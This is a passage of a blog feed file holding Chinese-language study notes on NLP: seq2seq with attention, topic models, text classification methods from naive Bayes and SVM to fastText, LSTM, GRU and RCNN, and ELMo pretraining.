src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/img/%5B6%5D_seq2seq_6.gif" srcset="/img/loading.gif" lazyload></p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/img/%5B7%5D_seq2seq_7.gif" srcset="/img/loading.gif" lazyload></p><p>​在更多的时候，为提升效果，会采用一个叫做<strong>注意力模型</strong>的模型来动态处理和解码</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/img/%5B8%5D_seq2seq_8.gif" srcset="/img/loading.gif" lazyload></p><p>​所谓的注意力机制，可以粗略地理解为是一种对于输入的信息，根据重要程度进行不同权重的加权处理(通常加权的权重来源于softmax后的结果)的机制，如下图所示，是一个在解码阶段，简单地对编码器中的hiddenstates进行不同权重的加权处理的过程。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/img/%5B9%5D_seq2seq_9.gif" srcset="/img/loading.gif" lazyload></p><p>更详细一点的<strong>注意力解码</strong>过程如下图所示。</p><ul><li>带注意力的解码器RNN接收<end>的嵌入(embedding)和一个初始的解码器隐藏状态(hiddenstate)。</end></li><li>RNN处理输入，产生新的隐藏状态向量（h4）。</li><li>attention的步骤：使用编码器隐藏状态(hiddenstate)和h4向量来计算该时间步长的上下文向量（C4）。</li><li>把h4和C4拼接成一个向量。</li><li>把拼接后的向量连接全连接层和softmax完成解码</li><li>每个时间点上重复这个操作</li></ul><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/img/attention_tensor_dance.gif" srcset="/img/loading.gif" lazyload></p><p>也可以把这个动态解码的过程展示成下述图所示的过程。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/img/%5B11%5D_seq2seq_9.gif" srcset="/img/loading.gif" lazyload></p><p>注意力机制可以学习源语言和目标语言之间词和词对齐关系的方式。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/img/attention_sentence.png" srcset="/img/loading.gif" lazyload></p><h2><span id="3attention">3.Attention</span></h2><p>​ seq2seq 是一个Encoder–Decoder结构的网络，它的输入是一个序列，输出也是一个序列， Encoder中将一个可变长度的信号序列变为固定长度的向量表达，Decoder将这个固定长度的向量变成可变长度的目标的信号序列。</p><blockquote><p>输入： <span class="math inline">\(x = (x_1,...,x_{T_x})\)</span></p><p>输出： <span class="math inline">\(y = (y_1,...,y_{T_y})\)</span></p><ol type="1"><li><p><span class="math inline">\(h_t = RNN_{enc}(x_t,h_{t-1})\)</span> , Encoder方面接受的是每一个单词wordembedding，和上一个时间点的hidden state。输出的是这个时间点的hiddenstate。</p></li><li><p><span class="math inline">\(s_t =RNN_{dec}(\hat{y_{t-1}},s_{t-1})\)</span> ，Decoder方面接受的是目标句子里单词的wordembedding，和上一个时间点的hidden state。</p></li><li><p><span class="math inline">\(c_i = \sum_{j=1}^{T_x}\alpha_{ij}h_j\)</span> , context vector是一个对于encoder输出的hiddenstates的一个加权平均。</p></li><li><p><span class="math inline">\(\alpha_{ij} =\frac{exp(e_{ij})}{\sum_{k=1}^{T_x}exp(e_{ik})}\)</span> ,每一个encoder的hidden states对应的权重。</p></li><li><p><span class="math inline">\(e_{ij} = score(s_i, h_j)\)</span> ,通过decoder的hidden states加上encoder的hiddenstates来计算一个分数，用于计算权重(4)</p></li><li><p><span class="math inline">\(\hat{s_t} =tanh(W_c[c_t;s_t])\)</span>, 将context vector 和 decoder的hidden states串起来。</p></li><li><p><span class="math inline">\(p(y_t|y_{&lt;t},x) =softmax(W_s\hat{s_t})\)</span> ，计算最后的输出概率。</p></li></ol></blockquote><p>​</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/img/pic2-edit.jpg" srcset="/img/loading.gif" lazyload></p><p>​ 其中Encoder的hidden state不一定要作为Decoder的hiddenstate输入，可以将Decoder的hidden state仅仅做常规初始化。</p><h3><span id="score">score</span></h3><p>​ 一般有三种score的计算方法</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/img/score.png" srcset="/img/loading.gif" lazyload></p><h4><span id="第1种">第1种</span></h4><p>输入是encoder的所有hidden states H: 大小为(hid dim, sequencelength)。decoder在一个时间点上的hidden state， s： 大小为（hid dim,1）。</p><blockquote><p>第一步：旋转H为（sequence length, hid dim) 与s做点乘得到一个大小为(sequence length, 1)的分数。</p><p>第二步：对分数做softmax得到一个合为1的权重。</p><p>第三步：将H与第二步得到的权重做点乘得到一个大小为(hid dim,1)的context vector。</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/img/pic8-edit.jpg" srcset="/img/loading.gif" lazyload></p><h4><span id="第2种">第2种</span></h4><p>输入是encoder的所有hidden states H: 大小为(hid dim1, sequencelength)。decoder在一个时间点上的hidden state， s： 大小为（hid dim2,1）。此处两个hidden state的纬度并不一样。</p><blockquote><p>第一步：旋转H为（sequence length, hid dim1) 与 Wa [大小为 hid dim1,hid dim 2)] 做点乘， 再和s做点乘得到一个 大小为(sequence length,1)的分数。</p><p>第二步：对分数做softmax得到一个合为1的权重。</p><p>第三步：将H与第二步得到的权重做点乘得到一个大小为(hid dim,1)的context vector。</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/img/pic9-edit.jpg" srcset="/img/loading.gif" lazyload></p><p>NMT官方Git：https://github.com/tensorflow/nmt</p><p>NMT官方Git翻译版本：<a href="seq2seq_application_step_by_step.html">HTML</a></p><h3><span id="tensorflow-attentionwrapper实现机制">tensorflow attentionwrapper实现机制</span></h3><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/img/seq2seq_pic/2022/04/10/17-39-28-672cd6.png" srcset="/img/loading.gif" lazyload></p><p>ref : https://tangshusen.me/2019/03/09/tf-attention/</p><p>AttentionWrapper实现相对于理解理论更复杂一些。</p><p>​ 简而言之，增加了attention layer，将attention算法中得到的contextvector与decoder当前输出cell_outputs(即hiddenstate)通过计算得到一个attention向量。当attentionlayer没有指定时，attention向量直接取contextvector(即，算法理论中的计算方式)。</p><p>​增加了cell_input_fn，将上一步的attention向量与当前步的inputs，联合成新的cell_inputs。</p><p>​ attention mechanism：输入decoder的cell_outputs(即hiddenstate)，与memory(encoder的hidden state)计算alignments(权重)</p><h2><span id="code-demo">Code Demo</span></h2><p>对联生成 -- <a href="https://github.com/RacleRay/Have_Fun/tree/master/Couplet_Generate">dir</a></p><p>诗歌生成 -- <a href="https://github.com/RacleRay/Have_Fun/tree/master/%E5%8F%A4%E8%AF%97%E7%94%9F%E6%88%90">dir</a></p>]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
          <category> NLP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> seq2seq </tag>
            
            <tag> attention </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>主题模型</title>
      <link href="/posts/4ede4335.html"/>
      <url>/posts/4ede4335.html</url>
      
        <content type="html"><![CDATA[<p>详见《统计学习方法》第二版，15-20章</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/主题模型.assets/image-20200227195220348.png" srcset="/img/loading.gif" lazyload alt="image" style="zoom:45%;"></p><p>​ 主题模型在《统计学习方法》第二版，15-20章有较为详细的介绍。</p><h3><span id="plsa">pLSA</span></h3><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/主题模型.assets/image-20200227195628182.png" srcset="/img/loading.gif" lazyload alt="image" style="zoom:33%;"></p><p>​包含“隐含变量”或者“缺失数据”的概率模型参数估计问题可以采用EM算法。</p><p>​ EM算法的步骤本质上是一种交替最优化（二部坐标下降法）：</p><blockquote><ol type="1"><li><p>E步骤：求隐含变量Given当前估计的参数条件下的后验概率。</p></li><li><p>M步骤：最大化Completedata对数似然函数的期望，此时我们使用E步骤里计算的隐含变量的后验概率，得到新的参数值。</p></li></ol></blockquote><h4><span id="em算法求解plsa">EM算法求解PLSA</span></h4><ul><li>已知量：w,d</li><li>隐变量：z</li><li>参数：P(w|z)，P(z|d)</li><li>E:直接写出</li><li>M:拉格朗日乘子法求解</li></ul><h3><span id="lda">LDA</span></h3><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/主题模型.assets/image-20200227195955265.png" srcset="/img/loading.gif" lazyload alt="image" style="zoom:40%;"></p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/主题模型.assets/image-20200227200025363.png" srcset="/img/loading.gif" lazyload alt="image" style="zoom:50%;"></p><h4><span id="em算法求解lda">EM算法求解LDA</span></h4><ul><li><p>已知量：w</p></li><li><p>隐变量：z，θ，φ</p></li><li><p>参数：a，β</p></li><li><p>E:直接写不出，需要用变分法近似，或者吉布斯采样</p></li><li><p>M:坐标下降法求解，可以考虑牛顿法</p><p>详见李航《统计学习方法》第二版，15-20章</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
          <category> NLP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> lda </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文本分类advanced</title>
      <link href="/posts/e6e273ef.html"/>
      <url>/posts/e6e273ef.html</url>
      
        <content type="html"><![CDATA[<h2><span id="细粒度分类">细粒度分类</span></h2><blockquote><p><strong>多标签问题</strong>，每一个类别标签训练一个分类器，忽略了不同类别标签间的联系。</p><p><strong>多任务学习</strong>，特征提取阶段共享参数，最后几层单独输出。优点是考虑了不同任务间的联系，有联系的类别标签可以一块训练，对不均衡的样本数据有增强作用。</p><p><strong>Seq2Seq</strong>，把多标签的预测问题看成了一个序列到序列的学习，这样既考虑了标签之间的联系，又可以处理大量标签的问题。</p><p><strong>AspectBased</strong>，当有每种Aspect（可理解为主题）相关信息，且每个样本属于特定的Aspect。需要根据属于识别Aspect和分类。</p></blockquote><h3><span id="数据处理">数据处理</span></h3><p>可选项有</p><ol type="1"><li>明显噪声处理，例如全篇标点符号，繁体转简体等。</li><li>分词器选择与自定义词典扩充。使用word2vec初始化时，训练词向量的词表和模型使用的词表一致（分词器不要混用）。</li><li>分词与分字特征可分别利用，训练不同模型集成。</li><li>word2vec 与 bert类模型提取的特征，拼接，输入下游任务设计。</li><li>EDA：同义词替换，随机删除、交换位置等。翻译效果不稳定。</li></ol><p>不平衡数据：</p><ol type="1"><li>上采样：罕见类数据随机打乱作为扩充。同义词替换，随机删除、交换位置等扩充。使用扩充数据时，不要连续使用增强后的数据，可以相隔一两个epoch使用。</li><li>下采样，数据利用率不高。</li><li>标签权重加入loss计算。实际效果是，不一定带来提高，尤其是复杂的分类任务，但可选。</li><li>Labelsmoothing。约束神经网络本身对错误标签的极大惩罚（loss在bp时，回传一般是label与predict之差）。提高泛化力。</li><li>focal loss。损失计算偏向于没有正确分类的输出修正（理论上）。</li></ol><p>使用预训练特征提取器时（EMLo，BERT类）：</p><ol type="1"><li>使用外部相似预料进行模型pretrain。</li><li>长度有限制的模型，可以尝试随机删除句子。（观测数据，如果开头和结尾重要，就删中间部分）</li></ol><h3><span id="模型">模型</span></h3><ul><li>Bi-GRU + Multi Capsule</li><li>Bi-GRU + Multi ResNet</li><li>HAN + Attention</li><li>Transformer Encoder + Convolutional</li></ul><h4><span id="seq2seq">Seq2Seq</span></h4><p>解码器三种思路：</p><ol type="1"><li>使用LSTM（或其他）每一步（#不同种类标签数）的output表示不同种类标签的预测输出</li><li>Beam Search尽量好的输出预测序列（只是在inference阶段使用）。</li><li>Global Embedding（在训练阶段使用），类似Beam Search：<ul><li><figure><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/Advanced.assets/image-20200525164408186.png" srcset="/img/loading.gif" lazyload alt="image"><figcaption aria-hidden="true">image</figcaption></figure></li><li>y为预测标签分布（outputsoftmax后的输出），e为每一步（#每一种标签）的output；g为globalembedding的输出，代替LSTM的hidden state，进行序列解码任务。</li><li>【SGM: Sequence Generation Model for Multi-LabelClassification】</li></ul></li></ol><h4><span id="aspect-based-sentimentanalysis">Aspect Based SentimentAnalysis</span></h4><p>抽取content特征，Aspect信息，使用各种方法attention到和输出label相关的信息。比如：</p><figure><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/Advanced.assets/image-20200525162258823.png" srcset="/img/loading.gif" lazyload alt="image"><figcaption aria-hidden="true">image</figcaption></figure><p>【Capsule Network with Interactive Attention for Aspect-LevelSentiment Classification】</p><p>另一种思路，树形（层级搜索）：</p><figure><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/Advanced.assets/image-20200525170827900.png" srcset="/img/loading.gif" lazyload alt="image"><figcaption aria-hidden="true">image</figcaption></figure><p>上图中加入aspect信息到输入层</p><h3><span id="模型训练">模型训练</span></h3><ol type="1"><li>Warm up：学习率先增加，然后减小。线性增加即可。也可以使用one cyclefitting，让学习率在一个epoch内，线性增加到一个较大值，然后线性减小为初始的较小学习率。绘制loss--lr曲线图，摘到loss的变化较大处的lr的十分之一。【ADISCIPLINED APPROACH TO NEURAL NETWORK HYPER-PARAMETERS: PART 1 –LEARNING RATE, BATCH SIZE, MOMENTUM, AND WEIGHT DECAY】</li><li>找到合适学习率后（实验），将模型迭代足够多次（loss可能在一段时间不降之后，突然下降），保留验证正确率最高的模型。加载上一个最优模型，学习率设为当前1/10（实验），继续训练模型，保留验证正确率最高的模型。加载上一个最优模型，去掉正则化策略(dropout等，如果有)，学习率再降低，训练到收敛。</li><li>先调整学习率，再调整其他模型超参数。</li><li>sequence模型，序列长度要选取合适。不损失太多信息。</li></ol>]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
          <category> NLP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fine-grained </tag>
            
            <tag> classification </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文本分类深度学习方法</title>
      <link href="/posts/bc7ffed8.html"/>
      <url>/posts/bc7ffed8.html</url>
      
        <content type="html"><![CDATA[<h2><span id="fasttext">fastText</span></h2><p>​ <a href="https://github.com/facebookresearch/fastText/tree/master/python">官方Git</a></p><p>​ fastText是Facebook AI Research在16年开源的一个文本分类器。其特点就是fast。相对于其它文本分类模型，如SVM，LogisticRegression和neuralnetwork等模型，fastText在保持分类效果的同时，大大缩短了训练时间。</p><blockquote><ul><li><strong>适合大型数据+高效的训练速度</strong>：在使用标准多核CPU的情况下10分钟内处理超过10亿个词</li><li>支持<strong>多语言</strong>表达：利用其语言形态结构，fastText能够被设计用来支持包括英语、德语、西班牙语、法语以及捷克语等多种语言。</li><li>fastText专注于<strong>文本分类</strong>，在许多标准问题上有较好的表现（例如文本倾向性分析或标签预测）。</li></ul></blockquote><p>​ fastText模型输入一个词的序列（一段文本或者一句话)，输出这个词序列属于不同类别的概率。</p><p>​序列中的词和词组组成特征向量，特征向量通过线性变换映射到中间层，中间层再映射到标签。fastText<strong>在预测标签时使用了非线性激活函数</strong>，但在<strong>中间层不使用非线性激活函数</strong>。</p><p>​ fastText 模型架构和 Word2Vec 中的 CBOW模型很类似。不同之处在于，fastText 预测标签，而 CBOW模型预测中间词。</p><p>​ 基本框架：</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/神经网络方法.assets/image-20200226232701301.png" srcset="/img/loading.gif" lazyload></p><h3><span id="字符n-gram">字符n-gram</span></h3><p>​将输入序列（一整句话，而不是CBOW的窗口输入），进行字符n-gram。n-gram一定程度上克服了CBOW这类bagof words模型无视了语序的缺点。</p><p>​ 罕见词仍然可以被分解成字符n-gram。</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml">apple &gt;&gt;&gt; <br>    “<span class="hljs-tag">&lt;<span class="hljs-name">ap”,</span> “<span class="hljs-attr">app</span>”, “<span class="hljs-attr">ppl</span>”, “<span class="hljs-attr">ple</span>”, “<span class="hljs-attr">le</span>&gt;</span>”<br>    <span class="hljs-tag">&lt;<span class="hljs-name">表示前缀，</span>&gt;</span>表示后缀<br></code></pre></div></td></tr></table></figure><p>​隐藏表征在不同类别所有分类器中进行共享，使得文本信息在不同类别中能够共同使用。</p><h3><span id="层次-softmax-分类">层次 Softmax 分类</span></h3><p>​ 基本思想是使用树的层级结构替代扁平化的标准Softmax，使得在计算 P(y=j)时，只需计算一条路径上的所有节点的概率值，无需在意其它的节点。</p><p>​ 层次Softmax的原理在文本表示笔记部分，在word2vec的优化部分进行了说明。</p><p>​一般情况下，使用fastText进行文本分类的同时也会产生词的embedding，即embedding是fastText分类的产物。</p><p>​用单词的embedding叠加获得的文档向量，词向量的重要特点就是<strong>向量的距离可以用来衡量单词间的语义相似程度</strong>，于是，在fastText模型中，这<strong>两段同类文本的向量应该是相似</strong>的。</p><hr><h2><span id="cnn">CNN</span></h2><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/神经网络方法.assets/image-20200227181258567.png" srcset="/img/loading.gif" lazyload></p><p>​ 卷积神经网络经常用来处理具有类似网格拓扑结构（grid-liketopology）的数据。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/神经网络方法.assets/image-20200227181538048.png" srcset="/img/loading.gif" lazyload></p><p>​ 应用于文本处理很简单。</p><h2><span id="rnn">RNN</span></h2><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/神经网络方法.assets/image-20200227181745278.png" srcset="/img/loading.gif" lazyload><span class="math display">\[h_t=f(x_t,h_{t-1})=\sigma(W_{xh}x_t+W_{hh}h_{t-1}+b_h)\]</span> ​ 其中<span class="math inline">\(W_{xh}\)</span>是输入到隐层的矩阵参数，<span class="math inline">\(W_{hh}\)</span>是隐层到隐层的矩阵参数，<span class="math inline">\(b_h\)</span>为隐层的偏置向量（bias）参数，<span class="math inline">\(\sigma\)</span>为<span class="math inline">\(sigmoid\)</span>函数。</p><p>​ 一般提取最后一个时刻的隐层状态作为句子表示进而使用分类模型。</p><h3><span id="lstm">LSTM</span></h3><p>​LSTM增加了记忆单元𝑐、输入门𝑖、遗忘门𝑓及输出门𝑜。这些门及记忆单元组合起来大大提升了循环神经网络处理长序列数据的能力。</p><blockquote><p><span class="math inline">\(i_t =\sigma{(W_{xi}x_t+W_{hi}h_{t-1}+b_i)}\)</span></p><p>$ f_t = (W_{xf}x_t+W_{hf}h_{t-1}+b_f) $</p><p>$ c_t = f_t c_{t-1}+i_t tanh(W_{xc}x_t+W_{hc}h_{t-1}+b_c) $</p><p>$o_t = (W_{xo}x_t+W_{ho}h_{t-1}+b_o) $</p><p>$ h_t = o_t tanh(c_t) $</p></blockquote><p>​ 其中，<span class="math inline">\(i_t, f_t, c_t,o_t\)</span>分别表示输入门，遗忘门，记忆单元及输出门的向量值，带角标的<span class="math inline">\(W\)</span>及<span class="math inline">\(b\)</span>为模型参数，<span class="math inline">\(tanh\)</span>为双曲正切函数，<span class="math inline">\(\odot\)</span><mark>表示逐元素（elementwise）的乘法操作</mark>。</p><p>​ 输入门控制着新输入进入记忆单元<span class="math inline">\(c\)</span>的强度，遗忘门控制着记忆单元维持上一时刻值的强度，输出门控制着输出记忆单元的强度。</p><p>​三种门的计算方式类似，但有着完全不同的参数，它们各自以不同的方式控制着记忆单元<span class="math inline">\(c\)</span>：</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/神经网络方法.assets/image-20200227182547937.png" srcset="/img/loading.gif" lazyload></p><p>Forget Gate：</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/神经网络方法.assets/image-20200229223725986.png" srcset="/img/loading.gif" lazyload></p><p>Input Gate：</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/神经网络方法.assets/image-20200229223750280.png" srcset="/img/loading.gif" lazyload></p><p>更新Cell state：</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/神经网络方法.assets/image-20200229223828649.png" srcset="/img/loading.gif" lazyload></p><p>Output Gate：</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/神经网络方法.assets/image-20200229223856230.png" srcset="/img/loading.gif" lazyload></p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/神经网络方法.assets/image-20200227182528708.png" srcset="/img/loading.gif" lazyload></p><p>​ 图中带有方块的线，没有在计算中直接公式求解，s即cellstate，通过hiddenstate的计算，从而进行信息传递。详细内容查找神经网络笔记。</p><p>​</p><h3><span id="gru">GRU</span></h3><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/神经网络方法.assets/image-20200229223926779.png" srcset="/img/loading.gif" lazyload></p><ul><li>将忘记门和输入门合并成为一个单一的更新门</li><li>同时合并了数据单元状态和隐藏状态</li><li>结构比LSTM的结构更加简单</li></ul><h3><span id="rcnn">RCNN</span></h3><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/神经网络方法.assets/image-20200227183731913.png" srcset="/img/loading.gif" lazyload></p><p>​ ​卷积层建立在一个BiRNN模型之上，通过正向和反向循环来构造一个单词的下文和上文，然后输入CNN，如下式：</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/pic/神经网络方法_pic/image-20200707005508194.png" srcset="/img/loading.gif" lazyload></p><p>​ 得到单词的上下文表示之后，用拼接的方式来表示这个单词.</p><p>​ 然后通过maxpooling层和全连接层，得到最后的输出。这一部分相当于文本表示的学习。</p><blockquote><p>​ 将该词向量放入一个单层神经网络中，得到所谓的潜语义向量（latentsemanticvector），这里卷积层的计算结束了，时间复杂度仍是O(n)。接下来进行池化层，这里采用max-pooling可以将向量中最大的特征提取出来，从而获取到整个文本的信息。池化过程时间复杂度也是O(n)，所以整个模型的时间复杂度是O(n)。得到文本特征向量之后，进行分类。</p></blockquote><h3><span id="quasi-rnn">Quasi-RNN</span></h3><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/神经网络方法.assets/image-20200314215708784.png" srcset="/img/loading.gif" lazyload alt="image-20200314215708784" style="zoom:67%;"></p><p>​ 框图显示了QRNN的计算结构与典型值的比较LSTM和CNN架构。红色表示卷积或矩阵乘法； 连续的块意味着这些计算可以并行进行。蓝色表示无参数功能沿通道/特征维度并行运行的对象。LSTM可以分解为（红色）线性块和（蓝色）element-wise部分，但每个时间步的计算仍取决于上一个时间步的结果。</p><p>​ fo-Pool指的是以下公式，包括forget 和 output 的h计算方式</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/pic/神经网络方法_pic/image-20200707005623708.png" srcset="/img/loading.gif" lazyload></p><p>而上图中</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/pic/神经网络方法_pic/image-20200707005656160.png" srcset="/img/loading.gif" lazyload></p><p>​</p>]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
          <category> NLP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fastText </tag>
            
            <tag> CNN </tag>
            
            <tag> RNN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文本分类传统机器学习方法</title>
      <link href="/posts/f4b85348.html"/>
      <url>/posts/f4b85348.html</url>
      
        <content type="html"><![CDATA[<h2><span id="朴素贝叶斯模型与中文文本分类">朴素贝叶斯模型与中文文本分类</span></h2><p><span class="math display">\[P(Y|X)=\frac{P(X|Y)P(Y)}{P(X)}\]</span></p><p><span class="math display">\[P(Y,X) = P(Y|X)P(X)=P(X|Y)P(Y)\]</span></p><p>​条件独立假设的一个缺陷是，<strong>失去了词语之间的顺序信息。</strong>这就相当于把所有的词汇扔进到一个袋子里随便搅和，贝叶斯都认为它们一样。因此这种情况也称作<strong>词袋模型(bagof words)</strong>。</p><h3><span id="优化">优化</span></h3><blockquote><ol type="1"><li>取对数</li><li>转换为权重，每个词一个重要度，而不是计数</li><li>选取top k关键词</li><li>分割样本，根据文本长度选择不同数量的关键词数量，文本长时选取多一些</li><li>位置权重：比如在标题中的关键词，权重大一些</li></ol></blockquote><h2><span id="logistic-regression">Logistic Regression</span></h2><p>​ Logistic回归并非最强大的分类算法，它可以很容易地被更为复杂的算法所超越，另一个缺点是它高度依赖正确的数据表示。但是其计算效率是相对较高的。不能用logistic 回归来解决非线性分类问题，因为它的决策边界是线性的。</p><h2><span id="svm">SVM</span></h2><p>​找到具有最小间隔的样本点，然后拟合出一个到这些样本点距离和最大的线段/平面。</p><p>​ 目标函数：</p><figure><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/机器学习方法.assets/image-20200226230633386.png" srcset="/img/loading.gif" lazyload alt="image"><figcaption aria-hidden="true">image</figcaption></figure><p>​ 优化问题可推导出：【过程见机器学习笔记】</p><figure><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/机器学习方法.assets/image-20200226230826078.png" srcset="/img/loading.gif" lazyload alt="image"><figcaption aria-hidden="true">image</figcaption></figure><p>​ 得到回归系数：</p><figure><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/机器学习方法.assets/image-20200226230922076.png" srcset="/img/loading.gif" lazyload alt="image"><figcaption aria-hidden="true">image</figcaption></figure><h2><span id="实验">实验</span></h2><p><a href="https://github.com/RacleRay/NotesForBlogs/blob/master/%E5%88%86%E7%B1%BB%E7%AE%97%E6%B3%95%E5%9C%A8%E6%96%87%E6%9C%AC%E9%97%AE%E9%A2%98%E4%B8%AD%E7%9A%84%E4%BD%BF%E7%94%A8.ipynb">notebook</a></p>]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
          <category> NLP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> classification </tag>
            
            <tag> machine learning </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文本表示进阶</title>
      <link href="/posts/ec2b8b1f.html"/>
      <url>/posts/ec2b8b1f.html</url>
      
        <content type="html"><![CDATA[<h1><span id="文本表示进阶">文本表示进阶</span></h1><figure><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/文本表示进阶.assets/image-20200225154730458.png" srcset="/img/loading.gif" lazyload alt="image"><figcaption aria-hidden="true">image</figcaption></figure><p>​预训练过程是做图像或者视频领域的一种比较常规的做法，这种做法很有效，能明显促进应用的效果。</p><p>​两种做法，一种是浅层加载的参数在训练C任务过程中不动，这种方法被称为“Frozen”;另外一种是底层网络参数尽管被初始化了，在C任务训练过程中仍然随着训练的进程不断改变，这种一般叫“Fine-Tuning”。</p><figure><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/文本表示进阶.assets/image-20200225155047368.png" srcset="/img/loading.gif" lazyload alt="image"><figcaption aria-hidden="true">image</figcaption></figure><p>​用ImageNet来做网络的预训练，主要有两点，一方面ImageNet是图像领域里有很多事先标注好训练数据的数据集合，是个很大的优势，量越大训练出的参数越靠谱；另外一方面因为ImageNet有1000类，类别多，所以通用性好。</p><p>​NLP相对图像的特点在于，词作为NLP的基本要素，比像素的抽象程度更高，已经加入了人类数万年进化而来的抽象经验。</p><p>​ 预训练语言模型的优势在于：</p><ol type="1"><li>近乎无限量的优质数据</li><li>无需人工标注</li><li>一次学习多次复用</li><li>学习到的表征可在多个任务中进行快速迁移</li></ol><p>​ <strong>word2vec的问题</strong>：WordEmbedding本质上是个静态的。不论新句子上下文单词是什么，这个单词的WordEmbedding不会跟着上下文场景的变化而改变。这就是问题所在，多义性的消失。</p><h2><span id="elmoembedding-fromlanguage-models">ELMo：Embedding fromLanguage Models</span></h2><p>​ ELMo采用了典型的两阶段过程，</p><ul><li>第一个阶段是利用语言模型进行预训练；</li><li>第二个阶段是在做下游任务时，从预训练网络中提取对应单词的网络各层的WordEmbedding作为新特征补充到下游任务中。</li></ul><figure><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/文本表示进阶.assets/image-20200225160513753.png" srcset="/img/loading.gif" lazyload alt="image"><figcaption aria-hidden="true">image</figcaption></figure><h3><span id="结构">结构</span></h3><p>​ ELMo 为了利用无标记数据，使用了语言模型：</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/文本表示进阶.assets/image-20200225161617614.png" srcset="/img/loading.gif" lazyload alt="image" style="zoom:50%;"></p><p>​ 基本框架是一个双层的Bi-LSTM，不过在第一层和第二层之间加入了一个残差结构（一般来说，残差结构能让训练过程更稳定）。做预训练的时候，ELMo的训练目标函数为: <span class="math display">\[\sum_{k=1}^{N} \log p\left(t_{k} | t_{1}, \ldots, t_{k-1}\right)+\logp\left(t_{k} | t_{k+1}, \ldots, t_{N}\right)\]</span></p><p>​ Bi-LSTM，一组正向，一组反向。<span class="math inline">\(t_k\)</span>之前的单词序列Context-before称为上文，之后的单词序列Context-after称为下文。</p><figure><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/文本表示进阶.assets/image-20200225163735959.png" srcset="/img/loading.gif" lazyload alt="image"><figcaption aria-hidden="true">image</figcaption></figure><h3><span id="输入层和输出层改进">输入层和输出层改进</span></h3><p>​ ELMo 借鉴了 2016 年 Google Brain 的 Rafal Jozefowicz 等人发表的Exploring the Limits of Language Modeling。输入层和输出层不再是word，而是变为了一个 <strong>char-based CNN 结构</strong>。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/文本表示进阶.assets/image-20200225162533301.png" srcset="/img/loading.gif" lazyload alt="image" style="zoom:40%;"></p><h4><span id="输出层">输出层：</span></h4><p>​ 将CBOW中的普通softmax: <span class="math display">\[P\left(w_{t} | c_{t}\right)=\frac{\exp\left(e^{\prime}\left(w_{t}\right)^{T} x\right)}{\sum_{i=1}^{|V|} \exp\left(e^{\prime}\left(w_{i}\right)^{T} x\right)}, x=\sum_{i \in c}e\left(w_{i}\right)\]</span> ​ 转换为： <span class="math display">\[p\left(t_{k} | t_{1}, \ldots, t_{k-1}\right)=\frac{\exp \left(C NN\left(t_{k}\right)^{T} h\right)}{\sum_{i=1}^{|V|} \exp \left(C NN\left(t_{i}\right)^{T} 